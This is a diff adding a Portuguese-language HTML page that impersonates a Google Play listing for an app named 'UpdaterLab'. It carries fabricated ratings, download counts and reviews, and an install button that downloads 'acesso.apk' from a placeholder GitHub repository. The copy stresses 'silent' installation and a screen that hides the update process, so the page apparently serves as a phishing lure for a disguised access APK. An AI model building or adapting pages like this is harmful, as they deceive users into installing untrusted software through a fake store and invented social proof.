@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UpdaterLab - Loja de Aplicativos</title>
+    <style>
+        :root {
+            --primary-color: #01875f; /* Verde característico */
+            --text-main: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #e8eaed;
+            --bg-color: #ffffff;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+        }
+
+        .header {
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            color: var(--text-secondary);
+        }
+
+        .header span {
+            font-weight: 500;
+            margin-left: 8px;
+        }
+
+        .container {
+            max-width: 840px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+
+        /* Cabeçalho do App */
+        .app-header {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .app-icon {
+            width: 144px;
+            height: 144px;
+            border-radius: 20%;
+            background: linear-gradient(135deg, #01875f, #005b4f);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .app-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .app-title {
+            font-size: 28px;
+            margin: 0 0 4px 0;
+            font-weight: 500;
+        }
+
+        .app-dev {
+            color: var(--primary-color);
+            font-size: 16px;
+            margin: 0 0 16px 0;
+            font-weight: 500;
+        }
+
+        .app-stats {
+            display: flex;
+            gap: 32px;
+            margin-bottom: 24px;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .stat-value {
+            color: var(--text-main);
+            font-weight: 500;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        /* Botão de Instalação */
+        .install-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 10px 48px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            width: fit-content;
+            transition: background-color 0.2s;
+        }
+
+        .install-btn:hover {
+            background-color: #00704e;
+        }
+
+        /* Capturas de Tela */
+        .section-title {
+            font-size: 18px;
+            font-weight: 500;
+            margin: 32px 0 16px 0;
+        }
+
+        .screenshots {
+            display: flex;
+            gap: 16px;
+            overflow-x: auto;
+            padding-bottom: 16px;
+        }
+
+        .screenshot-img {
+            min-width: 200px;
+            height: 350px;
+            background-color: #f1f3f4;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-secondary);
+        }
+
+        /* Sobre este app */
+        .description {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--text-secondary);
+        }
+
+        /* Avaliações */
+        .reviews-container {
+            margin-top: 24px;
+        }
+
+        .review {
+            margin-bottom: 32px;
+        }
+
+        .review-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e8eaed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-secondary);
+            font-weight: bold;
+        }
+
+        .author-name {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .review-date {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .stars {
+            color: var(--primary-color);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .review-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        ☰ <span>Google Play</span>
+    </div>
+
+    <div class="container">
+        <!-- Cabeçalho do App -->
+        <div class="app-header">
+            <div class="app-icon">UL</div>
+            <div class="app-info">
+                <h1 class="app-title">UpdaterLab</h1>
+                <p class="app-dev">Seu Nome / Empresa</p>
+                
+                <div class="app-stats">
+                    <div class="stat-item">
+                        <span class="stat-value">4,8 ★</span>
+                        <span>12 mil avaliações</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value">100 mil+</span>
+                        <span>Downloads</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value">Livre</span>
+                        <span>Classificação</span>
+                    </div>
+                </div>
+
+                <!-- IMPORTANTE: Substitua o href pelo link "Raw" do seu .apk no GitHub -->
+                <a href="https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPOSITORIO/main/acesso.apk" download class="install-btn">Instalar</a>
+            </div>
+        </div>
+
+        <!-- Capturas de Tela -->
+        <div class="section-title">Sobre este app</div>
+        <div class="screenshots">
+            <div class="screenshot-img">Tela Principal</div>
+            <div class="screenshot-img">Status do Sistema</div>
+            <div class="screenshot-img">Configurações</div>
+        </div>
+
+        <p class="description">
+            O UpdaterLab é a ferramenta definitiva para gerenciamento de pacotes e atualizações do sistema em dispositivos embarcados. Mantenha seu ambiente seguro, estável e sempre na versão mais recente com um processo de instalação silencioso e eficiente.
+        </p>
+
+        <!-- Avaliações e Comentários -->
+        <div class="section-title">Classificações e resenhas</div>
+        
+        <div class="reviews-container">
+            <div class="review">
+                <div class="review-header">
+                    <div class="avatar">C</div>
+                    <div>
+                        <div class="author-name">Carlos Silva</div>
+                        <div class="review-date">12 de setembro de 2026</div>
+                    </div>
+                </div>
+                <div class="stars">★★★★★</div>
+                <div class="review-text">
+                    Excelente gerenciador! A nova interface ficou muito mais amigável. A mensagem "carregando aplicativo, aguarde" durante o processo deixou a tela bem menos assustadora para o usuário final do que a antiga tela de atualização do sistema. Funciona perfeitamente.
+                </div>
+            </div>
+
+            <div class="review">
+                <div class="review-header">
+                    <div class="avatar">M</div>
+                    <div>
+                        <div class="author-name">Mariana Costa</div>
+                        <div class="review-date">5 de setembro de 2026</div>
+                    </div>
+                </div>
+                <div class="stars">★★★★☆</div>
+                <div class="review-text">
+                    O aplicativo cumpre o que promete e compila sem erros no Gradle agora. Só acho que poderiam adicionar um modo escuro na próxima versão. Tirando isso, o fluxo de instalação de pacotes está super rápido!
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
